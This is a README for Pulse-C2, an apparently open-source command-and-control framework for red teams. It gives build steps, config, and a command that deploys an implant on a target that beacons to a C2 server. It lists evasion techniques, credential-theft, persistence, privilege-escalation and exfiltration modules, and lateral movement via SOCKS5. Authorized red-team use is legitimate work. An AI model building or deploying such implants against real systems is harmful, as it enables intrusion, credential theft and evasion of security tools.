<div align="center">

# ⚡ Pulse-C2

### *Enterprise Command & Control Platform*

[![Go Version](https://img.shields.io/badge/Go-1.25+-00ADD8?style=for-the-badge&logo=go&logoColor=white)](https://golang.org/)
[![Vue 3](https://img.shields.io/badge/Vue_3-4FC08D?style=for-the-badge&logo=vue.js&logoColor=white)](https://vuejs.org/)
[![License](https://img.shields.io/badge/License-MIT-FF6B35?style=for-the-badge)](LICENSE)
[![Build](https://img.shields.io/badge/Build-Passing-28A745?style=for-the-badge&logo=github-actions&logoColor=white)]()
[![Platform](https://img.shields.io/badge/Platform-Linux%20|%20Windows%20|%20macOS-6C63FF?style=for-the-badge)]()
[![PRs](https://img.shields.io/badge/PRs-Welcome-2EA043?style=for-the-badge&logo=git&logoColor=white)]()

<img src="https://capsule-render.vercel.app/api?type=waving&color=0:0d1117,50:6C63FF,100:00D4AA&height=200&section=header&text=Pulse-C2&fontSize=80&fontColor=FFFFFF&animation=fadeIn&fontAlignY=35&desc=Enterprise%20C2%20Platform%20|%20Encrypted%20|%20Modular%20|%20Real-time&descAlignY=55&descSize=18" width="100%"/>

[![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&weight=600&size=22&duration=3000&pause=800&color=6C63FF&center=true&vCenter=true&width=800&lines=Encrypted+Multi-Agent+Communication;AV+Evasion+%26+Stealth+Operations;SOCKS5+Proxy+Tunneling+System;Real-Time+Telemetry+%26+Analytics;Enterprise-Grade+Red+Team+Platform)](https://git.io/typing-svg)

---

</div>

## 📋 Overview

**Pulse-C2** (formerly BTY) is an **enterprise-grade Command & Control platform** purpose-built for red team operations, security assessments, and adversary simulation. Engineered with a **Go-based C2 server**, **lightweight implants**, and a **Vue 3 web dashboard**, Pulse-C2 delivers encrypted multi-agent communication, AV/EDR evasion capabilities, SOCKS5 proxy tunneling, and real-time telemetry – all wrapped in a modern, modular architecture.

> ⚠️ **AUTHORIZED USE ONLY** — This tool is designed exclusively for authorized security assessments, penetration testing, and research. Unauthorized use is prohibited.

---

## 🏗️ Architecture

```mermaid
graph TB
    Client[Implant/Agent - Windows/Linux/macOS]
    Proxy[SOCKS5 Proxy]
    Server[C2 Server - Go/TLS + REST + WebSocket]
    DB[(SQLite / PostgreSQL)]
    FS[File Storage - Exfil + Payloads]
    UI[Web UI - Vue 3 / Vite]
    CLI[CLI Client + Builder]

    Client <-->|Encrypted Tunnel - X25519+XChaCha20| Server
    Client -.->|WebRTC (Pion)| Server
    Server <-->|REST API + WebSocket| UI
    Proxy <-->|SOCKS5 via C2 Relay| Server
    Server --> DB
    Server --> FS
```

---

## ✨ Key Features

| Feature | Description |
|---------|-------------|
| 🔐 **End-to-End Encryption** | X25519 key exchange + XChaCha20-Poly1305 AEAD per-session encryption |
| 🧩 **Multi-Agent Architecture** | Simultaneous implant management with independent encrypted channels |
| 🛡️ **AV/EDR Evasion** | Runtime encryption, polymorphism, sleep obfuscation, indirect syscalls |
| 🌍 **SOCKS5 Tunneling** | Full proxy chain through C2 for lateral movement & tool proxying |
| 📡 **Real-Time Telemetry** | Live agent status, geo-location, process tree, network connections |
| 📊 **Vue 3 Dashboard** | Dark-themed reactive UI with real-time WebSocket updates |
| 🔌 **Modular Payload System** | Plugin-based modules for credential theft, persistence, discovery |
| 📁 **File Exfiltration** | Chunked encrypted file transfers with resume support |
| 🌐 **WebRTC Channels** | P2P communication via Pion WebRTC for NAT traversal |
| 🧪 **Extensible API** | REST APIs + Protobuf serialization for custom integrations |
| 📝 **Full Audit Logging** | Every command and response logged with timestamps and agent ID |

---

## 🚀 Quick Start

### Prerequisites

- **Go** 1.25+ ([install](https://go.dev/dl/))
- **Node.js** 18+ & npm
- **SQLite** (built-in, zero config) or **PostgreSQL** 14+ (optional)

### Clone & Build

```bash
git clone https://github.com/Ruby570bocadito/Pulse-C2.git
cd Pulse-C2

# Build C2 server
cd src/go && go build -o ../../dist/pulse-server ./cmd/server

# Build agent/implant
go build -o ../../dist/pulse-agent ./cmd/agent

# Build payload builder
go build -o ../../dist/pulse-builder ./cmd/builder

# Setup Web UI (Vue 3 + Vite)
cd ../../web && npm install && npm run build
```

### Configure

```bash
# Edit config.yaml (SQLite by default, zero config)
# Or use a custom config:
cp config.example.yaml my-config.yaml
# Edit my-config.yaml to your needs
```

### Run

```bash
# 1. Launch C2 server (SQLite by default — no DB setup needed)
./dist/pulse-server --config config.yaml

# 2. Start Web UI (dev mode)
cd web && npm run dev

# 3. Deploy agent on target
./dist/pulse-agent --server https://c2.example.com:8443 --interval 5
```

### Docker

```bash
# Build and run everything with Docker Compose
docker compose up --build

# Or build individual images:
docker build -t pulse-c2-server -f Dockerfile .
docker build -t pulse-c2-agent -f Dockerfile.agent .
```

---

## 📦 Project Structure

```
Pulse-C2/
├── src/
│   ├── go/
│   │   ├── cmd/
│   │   │   ├── server/         # C2 server entrypoint
│   │   │   ├── agent/          # Implant/agent entrypoint
│   │   │   └── builder/        # Payload builder
│   │   ├── internal/           # Shared packages (crypto, protocol, etc.)
│   │   └── go.mod
│   └── agents/                 # Agent-specific code (per-platform)
├── web/                        # Vue 3 + Vite frontend
│   ├── src/                    # Vue components
│   └── package.json
├── api/                        # API definitions / Protobuf specs
├── modules/                    # Plugins & payload modules
├── payloads/                   # Pre-built payloads
├── docs/                       # Documentation
├── tests/                      # Integration tests
├── scripts/                    # Automation scripts
├── dist/                       # Build output
├── config.yaml                 # Default configuration
├── config.example.yaml         # Example configuration
├── Dockerfile                  # Server docker image
├── Dockerfile.agent            # Agent docker image
├── docker-compose.yml          # Multi-service deployment
├── Makefile
└── CHANGELOG.md
```

---

## 🧩 Module & Agent Matrix

| Agent / Module | Architecture | Protocol | Evasion | Purpose |
|----------------|-------------|----------|---------|---------|
| 🟢 **Pulse-Beacon** | Windows x64 | HTTPS + Protobuf | Sleep masking, API unhooking | Long-term persistence & beaconing |
| 🔵 **Pulse-Shell** | Linux x64 | WebSocket | Process hollowing | Interactive shell access |
| 🟣 **Pulse-Tunnel** | Cross-platform | SOCKS5 via C2 | Traffic obfuscation | Proxy/lateral movement |
| 🟠 **Pulse-Gather** | Cross-platform | Protobuf stream | — | Host recon & data collection |
| 🔴 **Pulse-Priv** | Windows x64 | Named pipe | Token manipulation | Privilege escalation |
| ⚪ **Pulse-Kill** | Windows/Linux | One-shot | Timestamp stomping | Process termination & cleanup |

> **Note:** Agent binaries are compiled via `cmd/builder` which embeds the appropriate agent type and configuration.

---

## 🔒 Cryptography

Pulse-C2 uses **modern AEAD encryption** for all agent-to-server communications:

| Component | Algorithm | Purpose |
|-----------|-----------|---------|
| 🔑 **Key Exchange** | X25519 ECDH | Ephemeral session key agreement |
| 🔐 **Encryption** | XChaCha20-Poly1305 | Authenticated symmetric encryption |
| 📜 **Certificate** | TLS 1.3 (mTLS optional) | Transport layer security |
| 🧂 **Nonce** | 192-bit random (XChaCha20) | Per-message uniqueness |

---

## ⚙️ Configuration

```yaml
# config.yaml
server:
  host: "0.0.0.0"
  port: 8443
  max_sessions: 5000
  heartbeat_interval: 30s
  session_timeout: 300s

database:
  driver: "sqlite"          # or "postgres"
  dsn: "bty.db"             # or "postgres://user:pass@localhost:5432/pulse_c2"

tls:
  enabled: true
  auto_cert: true           # Let's Encrypt auto certs
  cert_file: ""
  key_file: ""

transport:
  http_port: 8445
  ws_port: 8446
  dns_port: 0
```

---

## 🧪 Development

```bash
# Run tests
cd src/go && go test ./...

# Lint
golangci-lint run ./src/go/...

# Build all (using Makefile)
make build-all
```

---

## 📸 Dashboard Preview

```
┌────────────────────────────────────────────────────────────┐
│  Pulse-C2 Dashboard                  ● 12 agents online     │
├──────────┬──────────┬──────────┬──────────┬─────────────────┤
│ Agent ID │ Platform │  Status  │  Uptime  │  Last Check-in  │
├──────────┼──────────┼──────────┼──────────┼─────────────────┤
│ abc123   │ Windows  │ 🟢 Online │ 14h 32m  │  just now       │
│ def456   │ Linux    │ 🟢 Online │ 6h 18m   │  12s ago        │
│ ghi789   │ macOS    │ 🟡 Idle   │ 2h 05m   │  45s ago        │
│ jkl012   │ Windows  │ 🔴 Dead   │ —        │  3h ago         │
└──────────┴──────────┴──────────┴──────────┴─────────────────┘
```

---

## 🤝 Contributing

Contributions are welcome — but **Pulse-C2 is intended for authorized security research only**. Please ensure you have proper authorization before testing or deploying.

1. Fork the repository
2. Create a feature branch (`git checkout -b feat/amazing`)
3. Commit your changes (`git commit -m 'feat: add amazing feature'`)
4. Push to the branch (`git push origin feat/amazing`)
5. Open a Pull Request

---

## 📄 License

Distributed under the **MIT License**. See [LICENSE](LICENSE) for details.

---

<div align="center">

**Pulse-C2** — *Enterprise Command & Control Platform*

Built with ⚡ for professional red teams

[Report Bug](https://github.com/Ruby570bocadito/Pulse-C2/issues) · [Request Feature](https://github.com/Ruby570bocadito/Pulse-C2/issues)

---

<img src="https://capsule-render.vercel.app/api?type=waving&color=0:00D4AA,50:6C63FF,100:0d1117&height=150&section=footer&text=—+Pulse-C2+—&fontSize=40&fontColor=FFFFFF&animation=fadeIn" width="100%"/>

</div>
